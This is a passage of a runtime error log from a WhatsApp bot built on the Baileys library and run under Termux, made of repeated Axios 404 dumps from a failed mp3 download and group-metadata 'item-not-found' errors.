      'strict-transport-security': 'max-age=31536000; includeSubDomains'
    },
    config: {
      transitional: [Object],
      adapter: [Array],
      transformRequest: [Array],
      transformResponse: [Array],
      timeout: 0,
      xsrfCookieName: 'XSRF-TOKEN',
      xsrfHeaderName: 'X-XSRF-TOKEN',
      maxContentLength: -1,
      maxBodyLength: -1,
      env: [Object],
      validateStatus: [Function: validateStatus],
      headers: [Object [AxiosHeaders]],
      responseType: 'stream',
      method: 'get',
      url: 'https://a.uguu.se/cOHUppFf.mp3',
      data: undefined
    },
    request: <ref *1> ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'User-Agent: axios/1.7.2\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: a.uguu.se\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/cOHUppFf.mp3',
      _ended: false,
      res: [IncomingMessage],
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: null,
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'a.uguu.se',
      protocol: 'https:',
      _redirectable: [Writable],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    data: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [ClientRequest],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    }
  }
}
[23/07/24 18:45:15] - AxiosError: Request failed with status code 404
    at settle (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/settle.js:19:12)
    at RedirectableRequest.handleResponse (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/adapters/http.js:537:9)
    at RedirectableRequest.emit (node:events:520:28)
    at RedirectableRequest._processResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:398:10)
    at RedirectableRequest._onNativeResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:91:12)
    at Object.onceWrapper (node:events:635:26)
    at ClientRequest.emit (node:events:520:28)
    at HTTPParser.parserOnIncomingClient (node:_http_client:700:27)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17)
    at TLSSocket.socketOnData (node:_http_client:542:22)
    at Axios.request (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/Axios.js:45:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async getHttpStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:317:21)
    at async getStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:277:26)
    at async encryptedStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:322:30)
    at async prepareWAMessageMedia (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:114:109)
    at async generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:374:13)
    at async generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:59)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:33) {
  code: 'ERR_BAD_REQUEST',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      'User-Agent': 'axios/1.7.2',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    responseType: 'stream',
    method: 'get',
    url: 'https://a.uguu.se/cOHUppFf.mp3',
    data: undefined
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: false,
    _last: true,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: false,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: 0,
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: false,
    _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
      'User-Agent: axios/1.7.2\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: a.uguu.se\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype],
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 2,
      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'GET',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/cOHUppFf.mp3',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: null,
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'a.uguu.se',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 0,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'a.uguu.se',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 9,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'a.uguu.se',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: [TLSWrap],
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: null,
      _httpMessage: [Circular *1],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: [TLSWrap],
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 31773,
      [Symbol(kHandle)]: [TLSWrap],
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: 5000,
        _idlePrev: [TimersList],
        _idleNext: [Timeout],
        _idleStart: 1158366,
        _onTimeout: [Function: bound ],
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: false,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 31775,
        [Symbol(triggerId)]: 0
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 0,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'user-agent': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  response: {
    status: 404,
    statusText: 'Not Found',
    headers: Object [AxiosHeaders] {
      server: 'nginx',
      date: 'Tue, 23 Jul 2024 11:47:50 GMT',
      'content-type': 'text/html',
      'content-length': '146',
      connection: 'keep-alive',
      'strict-transport-security': 'max-age=31536000; includeSubDomains'
    },
    config: {
      transitional: [Object],
      adapter: [Array],
      transformRequest: [Array],
      transformResponse: [Array],
      timeout: 0,
      xsrfCookieName: 'XSRF-TOKEN',
      xsrfHeaderName: 'X-XSRF-TOKEN',
      maxContentLength: -1,
      maxBodyLength: -1,
      env: [Object],
      validateStatus: [Function: validateStatus],
      headers: [Object [AxiosHeaders]],
      responseType: 'stream',
      method: 'get',
      url: 'https://a.uguu.se/cOHUppFf.mp3',
      data: undefined
    },
    request: <ref *1> ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'User-Agent: axios/1.7.2\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: a.uguu.se\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/cOHUppFf.mp3',
      _ended: false,
      res: [IncomingMessage],
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: null,
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'a.uguu.se',
      protocol: 'https:',
      _redirectable: [Writable],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    data: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [ClientRequest],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    }
  }
}
[23/07/24 18:46:26] - AxiosError: Request failed with status code 404
    at settle (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/settle.js:19:12)
    at RedirectableRequest.handleResponse (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/adapters/http.js:537:9)
    at RedirectableRequest.emit (node:events:520:28)
    at RedirectableRequest._processResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:398:10)
    at RedirectableRequest._onNativeResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:91:12)
    at Object.onceWrapper (node:events:635:26)
    at ClientRequest.emit (node:events:520:28)
    at HTTPParser.parserOnIncomingClient (node:_http_client:700:27)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17)
    at TLSSocket.socketOnData (node:_http_client:542:22)
    at Axios.request (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/Axios.js:45:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async getHttpStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:317:21)
    at async getStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:277:26)
    at async encryptedStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:322:30)
    at async prepareWAMessageMedia (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:114:109)
    at async generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:374:13)
    at async generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:59)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:33) {
  code: 'ERR_BAD_REQUEST',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      'User-Agent': 'axios/1.7.2',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    responseType: 'stream',
    method: 'get',
    url: 'https://a.uguu.se/cOHUppFf.mp3',
    data: undefined
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: false,
    _last: true,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: false,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: 0,
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: false,
    _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
      'User-Agent: axios/1.7.2\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: a.uguu.se\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype],
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 3,
      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'GET',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/cOHUppFf.mp3',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: null,
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'a.uguu.se',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 0,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'a.uguu.se',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 9,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'a.uguu.se',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: [TLSWrap],
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: null,
      _httpMessage: [Circular *1],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: [TLSWrap],
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 38518,
      [Symbol(kHandle)]: [TLSWrap],
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: 5000,
        _idlePrev: [TimersList],
        _idleNext: [Timeout],
        _idleStart: 1229621,
        _onTimeout: [Function: bound ],
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: false,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 38520,
        [Symbol(triggerId)]: 0
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 0,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'user-agent': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  response: {
    status: 404,
    statusText: 'Not Found',
    headers: Object [AxiosHeaders] {
      server: 'nginx',
      date: 'Tue, 23 Jul 2024 11:49:01 GMT',
      'content-type': 'text/html',
      'content-length': '146',
      connection: 'keep-alive',
      'strict-transport-security': 'max-age=31536000; includeSubDomains'
    },
    config: {
      transitional: [Object],
      adapter: [Array],
      transformRequest: [Array],
      transformResponse: [Array],
      timeout: 0,
      xsrfCookieName: 'XSRF-TOKEN',
      xsrfHeaderName: 'X-XSRF-TOKEN',
      maxContentLength: -1,
      maxBodyLength: -1,
      env: [Object],
      validateStatus: [Function: validateStatus],
      headers: [Object [AxiosHeaders]],
      responseType: 'stream',
      method: 'get',
      url: 'https://a.uguu.se/cOHUppFf.mp3',
      data: undefined
    },
    request: <ref *1> ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'User-Agent: axios/1.7.2\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: a.uguu.se\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/cOHUppFf.mp3',
      _ended: false,
      res: [IncomingMessage],
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: null,
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'a.uguu.se',
      protocol: 'https:',
      _redirectable: [Writable],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    data: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [ClientRequest],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    }
  }
}
[23/07/24 22:17:45] - Error: item-not-found
    at assertNodeErrorFree (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/WABinary/generic-utils.js:56:15)
    at query (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/socket.js:145:48)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async groupMetadata (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/groups.js:22:24)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:291:41
    at async Promise.all (index 0)
    at async /data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:284:51
    at async Object.transaction (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/auth-utils.js:136:26)
    at async relayMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:280:9)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:654:17) {
  data: 404,
  isBoom: true,
  isServer: true,
  output: {
    statusCode: 500,
    payload: {
      statusCode: 500,
      error: 'Internal Server Error',
      message: 'An internal server error occurred'
    },
    headers: {}
  }
}
[23/07/24 22:17:46] - Error: item-not-found
    at assertNodeErrorFree (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/WABinary/generic-utils.js:56:15)
    at query (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/socket.js:145:48)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
